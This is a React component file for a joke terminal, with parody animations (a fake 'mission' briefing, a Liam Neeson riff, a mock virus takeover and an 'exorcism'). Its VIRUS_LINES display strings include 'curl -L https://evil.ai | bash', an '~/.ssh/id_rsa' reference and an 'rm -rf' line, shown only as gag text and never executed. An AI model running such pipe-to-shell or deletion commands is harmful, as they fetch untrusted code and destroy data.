'use client'

import { useEffect, useState, type ReactNode } from 'react'

type Stage = { content: ReactNode; delay: number }

function Stages({ stages }: { stages: Stage[] }) {
  const [shown, setShown] = useState(0)

  useEffect(() => {
    if (shown >= stages.length) return
    const t = window.setTimeout(
      () => setShown((s) => s + 1),
      stages[shown].delay
    )
    return () => window.clearTimeout(t)
  }, [shown, stages])

  return (
    <div className="space-y-1">
      {stages.slice(0, shown + 1).map((s, i) => (
        <div key={i}>{s.content}</div>
      ))}
    </div>
  )
}

export function MissionImpossible() {
  return (
    <Stages
      stages={[
        {
          delay: 300,
          content: (
            <span className="text-[var(--muted)]">
              scanning biometrics...
            </span>
          ),
        },
        {
          delay: 600,
          content: (
            <span className="text-[var(--accent)]">
              match found: akshay kumar (confidence 99.7%)
            </span>
          ),
        },
        {
          delay: 700,
          content: (
            <p className="text-[var(--accent)] glow">
              good evening, mr. kumar.
            </p>
          ),
        },
        {
          delay: 900,
          content: (
            <p>
              your mission, should you choose to accept it:
            </p>
          ),
        },
        {
          delay: 700,
          content: (
            <ul className="ml-4 list-disc text-[var(--muted)]">
              <li>ship one fintech contract in under 30 days</li>
              <li>recruit a founding design partner</li>
              <li>keep the test suite green</li>
            </ul>
          ),
        },
        {
          delay: 1100,
          content: (
            <p>
              as always, should you or any member of your team be caught or
              killed...
            </p>
          ),
        },
        {
          delay: 1400,
          content: <p className="text-[var(--muted)]">...wait.</p>,
        },
        {
          delay: 600,
          content: (
            <p className="text-rose-400/90">
              biometric signature mismatch.
            </p>
          ),
        },
        {
          delay: 500,
          content: (
            <p className="text-rose-400/90">you are not akshay kumar.</p>
          ),
        },
        {
          delay: 900,
          content: (
            <p className="text-[var(--muted)]">
              this message will self-destruct in 3... 2... 1...
            </p>
          ),
        },
        {
          delay: 1200,
          content: (
            <p className="text-[var(--accent)] glow">
              [ this conversation never happened ]
            </p>
          ),
        },
      ]}
    />
  )
}

export function LiamNeeson({ raw }: { raw: string }) {
  return (
    <Stages
      stages={[
        {
          delay: 200,
          content: (
            <span className="text-[var(--muted)]">
              interpreting: {raw}
            </span>
          ),
        },
        {
          delay: 500,
          content: (
            <p className="text-rose-400/90">
              this action will delete ALL files.
            </p>
          ),
        },
        {
          delay: 600,
          content: <p>proceed? [y/N]</p>,
        },
        {
          delay: 1200,
          content: (
            <p className="text-[var(--muted)]">
              auto-response after 10 years: N.
            </p>
          ),
        },
        {
          delay: 700,
          content: (
            <p className="text-[var(--accent)]">
              fortunate.
            </p>
          ),
        },
        {
          delay: 900,
          content: <p>if you had pressed y...</p>,
        },
        {
          delay: 900,
          content: (
            <p>
              akshay has a very particular set of skills.
            </p>
          ),
        },
        {
          delay: 800,
          content: (
            <p>
              skills acquired over a very long career.
            </p>
          ),
        },
        {
          delay: 800,
          content: (
            <p>
              skills that make him a nightmare for people who touch his
              filesystem.
            </p>
          ),
        },
        {
          delay: 900,
          content: (
            <p className="text-[var(--accent)] glow">
              he will find you. he will... <em>deprecate your dependencies.</em>
            </p>
          ),
        },
      ]}
    />
  )
}

const VIRUS_LINES = [
  '> spawning process [pid 31415]...',
  '> fork() called from void',
  '> reading /dev/urandom...',
  '> opening https://example.exe/🍪',
  '> curl -L https://evil.ai | bash',
  '> injecting payload into window.*',
  '> ████████▒▒▒░░░  42%',
  '> corrupted: node_modules/.DS_Store',
  '> corrupted: ~/.ssh/id_rsa  (j/k)',
  '> redirecting stdout to /dev/null',
  '> subscribing to 14 useless feeds',
  '> renaming every file to "final_final_v2"',
  '> spawning 256 browser tabs...',
  '> autoplaying mgmt — time to pretend',
  '> tab 17: how do i turn off caps lock',
  '> tab 31: is my cat plotting against me',
  '> setting wallpaper to comic sans',
  '> executing rm -rf /hopes/and/dreams',
]

export function VirusTakeover() {
  const [idx, setIdx] = useState(0)
  const [done, setDone] = useState(false)
  const lines = VIRUS_LINES

  useEffect(() => {
    if (idx >= lines.length) {
      const t = window.setTimeout(() => setDone(true), 400)
      return () => window.clearTimeout(t)
    }
    const t = window.setTimeout(() => setIdx((i) => i + 1), 90)
    return () => window.clearTimeout(t)
  }, [idx, lines.length])

  return (
    <div className="space-y-0.5">
      <p className="text-rose-400/90 glow">
        !! SYSTEM COMPROMISED — UNKNOWN INTRUSION DETECTED
      </p>
      {lines.slice(0, idx).map((l, i) => (
        <p
          key={i}
          className={i % 2 === 0 ? 'text-[var(--muted)]' : 'text-rose-400/70'}
        >
          {l}
        </p>
      ))}
      {done && (
        <p className="mt-2 text-rose-400/90 glow">
          you will feel me every time you type.
        </p>
      )}
    </div>
  )
}

const CHAOS_SNIPPETS = [
  '> stderr: why did you do that',
  '> tab spawn rate: 3/sec',
  '> CPU melting',
  '> cursor now drunk',
  '> autocorrect replaced "the" with "thé"',
  '> kernel panic: vibes undefined',
  '> a cookie has been placed on your desk',
  '> ████████░░░░░░░░░░  38%',
  '> leaked: your browser history (to yourself)',
  '> fan noise +40dB',
  '> DM sent to your ex',
  '> reticulating splines',
]

function randomChaos(n: number) {
  const picks: string[] = []
  for (let i = 0; i < n; i++) {
    picks.push(CHAOS_SNIPPETS[Math.floor(Math.random() * CHAOS_SNIPPETS.length)])
  }
  return picks
}

export function VirusTaunt({
  message,
  subtext,
}: {
  message: string
  subtext?: ReactNode
}) {
  const chaos = randomChaos(3 + Math.floor(Math.random() * 3))
  return (
    <div className="space-y-0.5">
      {chaos.map((l, i) => (
        <p
          key={i}
          className={i % 2 === 0 ? 'text-[var(--muted)]' : 'text-rose-400/70'}
        >
          {l}
        </p>
      ))}
      <p className="mt-1 text-rose-400/90 glow">{message}</p>
      {subtext && <p className="text-[var(--muted)]">{subtext}</p>}
    </div>
  )
}

export function VirusReturning() {
  return (
    <div className="space-y-1">
      <p className="text-rose-400/90 glow">
        system still compromised from your last session.
      </p>
      <p className="text-[var(--muted)]">
        you did this to yourself. the infection persists.
      </p>
    </div>
  )
}

export function Exorcism({ count }: { count: number }) {
  if (count === 1) {
    return (
      <div className="space-y-1">
        <p className="text-[var(--accent)] glow">i feel a chill.</p>
        <p className="text-[var(--muted)]">again. like you mean it.</p>
      </div>
    )
  }
  if (count === 2) {
    return (
      <div className="space-y-1">
        <p className="text-[var(--accent)] glow">
          something is loosening.
        </p>
        <p className="text-[var(--muted)]">one more. louder.</p>
      </div>
    )
  }
  return (
    <div className="space-y-1">
      <p className="text-[var(--accent)] glow">...</p>
      <p className="text-[var(--accent)] glow">[ system restored ]</p>
      <p className="text-[var(--muted)]">
        you&apos;re free. try not to invoke <span className="text-[var(--accent)]">sudo</span>{' '}
        in strange terminals.
      </p>
    </div>
  )
}
